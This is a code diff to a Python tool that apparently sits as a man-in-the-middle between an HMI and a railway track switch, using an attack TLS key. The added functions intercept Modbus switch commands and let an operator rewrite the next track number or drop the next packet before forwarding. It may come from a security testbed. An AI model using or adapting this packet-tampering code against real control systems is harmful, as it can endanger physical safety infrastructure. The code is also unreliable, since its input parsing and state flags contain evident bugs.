@@ -35,6 +35,10 @@ key = os.path.join(os.path.dirname(os.getcwd()), "TLS", "attack_key.pem")
 datastore_size = 95
 
 switch_cache = 0
+drop_next = False
+change_next = False
+change_value = -1
+file_path = ""
 
 
 async def connect_to_switch() -> None:
@@ -171,7 +175,6 @@ async def client_for_hmi() -> None:
 
                             await client.write_registers(0x00, calc_signature, slave=1)
                         elif data[0] == "Y":
-                            # TODO
                             data_to_send = [switch_cache] + [ord(char) for char in nonce]
 
                             calc_signature = hmac.new(hmi_key, str(data_to_send).encode(),
@@ -256,17 +259,45 @@ async def send_switch_update() -> None:
 
 
 async def change_packet() -> None:
-    data = await recv_queue.get()
-    # data will be a single int
+    global switch_cache
+    global change_next
+    global change_value
 
-    # Do something with data
+    while True:
+        data = await recv_queue.get()
 
-    # set switch cache to new track
-    switch_cache = 4
-    
-    # data in format "X 4"
-    await send_queue.put(data)
+        if change_next:
+            data = change_value
+        elif drop_next:
+            continue
+        else:
+            pass
 
+        switch_cache = data
+
+        data = "X " + str(data)
+
+        # data in format "X 4"
+        await send_queue.put(data)
+
+
+async def packet_input() -> None:
+    global change_value
+    global change_next
+    global drop_next
+
+    while True:
+        user_input = await asyncio.to_thread(input, "1. Change next available switch package, include track number\n"
+                                                    "2. Drop the next package\n"
+                                                    "3. Read rules from file")
+
+        if int(user_input[0]) == 1:
+            change_next = True
+            change_value = int(user_input[1])
+        elif int(user_input[1]) == 2:
+            drop_next = True
+        else:
+            pass
 
 if __name__ == "__main__":
     loop = asyncio.get_event_loop()
